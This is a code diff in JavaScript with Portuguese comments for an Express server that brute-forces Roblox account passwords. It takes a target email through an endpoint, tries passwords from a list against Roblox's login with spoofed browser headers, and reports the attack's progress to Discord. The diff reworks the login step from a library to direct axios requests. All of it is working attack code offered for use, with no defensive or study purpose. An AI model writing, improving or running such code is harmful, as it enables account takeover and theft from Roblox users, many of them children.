@@ -2,7 +2,6 @@ const express = require('express');
 const axios = require('axios');
 const fs = require('fs');
 const path = require('path');
-const Roblox = require('roblox.js');
 
 const app = express();
 const port = process.env.PORT || 3000;
@@ -27,31 +26,58 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (USANDO ROBLOX.JS)
+// Função para tentar Login no Roblox
 async function tryRobloxLogin(email, password) {
-    const robloxClient = new Roblox();
+    const baseUrl = "https://www.roblox.com";
+
+    // Criar um cliente Axios
+    const client = axios.create({
+        baseURL: baseUrl,
+        timeout: 8000,
+        withCredentials: true, // Importante para cookies
+        headers: {
+            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
+            'Accept': 'application/json, text/javascript, */*; q=0.01',
+            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8', // Formato correto para o formulário
+            'X-Requested-With': 'XMLHttpRequest',
+            'Referer': 'https://www.roblox.com/login'
+        }
+    });
 
     try {
-        // A biblioteca roblox.js faz todo o trabalho sujo de cookies e tokens
-        const user = await robloxClient.login.loginWithUsernamePassword(email, password);
+        // 1. Fazer um GET no site principal para pegar os cookies iniciais
+        const getResponse = await client.get('/');
 
-        if (user && user.Id) {
+        // 2. Tentar fazer Login
+        // Usar o formato de formulário: username=EMAIL&password=PASSWORD
+        const formData = `username=${encodeURIComponent(email)}&password=${encodeURIComponent(password)}`;
+        
+        const response = await client.post('/users/login', formData);
+
+        // Se o Roblox devolver um ID, foi sucesso
+        if (response.data && response.data.id) {
             return {
                 success: true,
-                username: user.Name,
-                userId: user.Id
+                username: response.data.username,
+                userId: response.data.id
             };
         } else {
+            // Se não tiver ID, verificar o erro
+            const errorMsg = response.data.error || "Erro Desconhecido";
             return {
                 success: false,
-                error: "Resposta vazia do Roblox"
+                error: errorMsg
             };
         }
+
     } catch (error) {
-        // A biblioteca devolve erros claros como "Password is incorrect" ou "User not found"
+        // Se der erro de rede ou status
+        const status = error.response ? error.response.status : 'Sem Status';
+        const data = error.response ? error.response.data : error.message;
+        
         return {
             success: false,
-            error: error.message || "Erro Desconhecido"
+            error: `Erro HTTP ${status}: ${JSON.stringify(data)}`
         };
     }
 }
@@ -75,7 +101,7 @@ async function startBruteForce(email) {
     }
 
     console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
-    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Usando biblioteca oficial roblox.js...*`);
+    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);
 
     let found = false;
 
@@ -106,7 +132,7 @@ async function startBruteForce(email) {
 }
 
 // ENDPOINT: Receber o Email do Site e Iniciar o Ataque
-app.post('/start-brute-force', async (req, res) {
+app.post('/start-brute-force', async (req, res) => {
     const { email } = req.body;
 
     if (!email || !email.includes('@')) {
